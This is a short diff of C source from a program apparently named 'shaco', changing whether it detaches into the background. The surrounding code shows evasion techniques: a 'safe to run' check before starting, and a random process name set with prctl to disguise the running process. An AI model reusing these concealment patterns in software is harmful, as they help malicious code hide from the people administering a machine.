@@ -26,6 +26,7 @@
 }*/
 
 void daemonize(){
+#ifdef DAEMONIZE
     pid_t _t = fork();
     if(_t < 0 || _t > 0) shaco_exit();
     setsid();
@@ -35,6 +36,7 @@ void daemonize(){
     if (_t < 0 || _t > 0) shaco_exit();
     umask(0);
     chdir("/");
+#endif
 }
 
 
@@ -42,9 +44,7 @@ bool shaco_init(char **argv){
     MSG("Checking if is safe to run");
     if(!is_safe_to_run()) { MSG("Is not safe to run"); return false;}
 
-#ifndef DEBUG
     daemonize();
-#endif
 
     char *procname = generate_random_str(generate_random_int(3,7));
     prctl(PR_SET_NAME, procname,0,0,0);
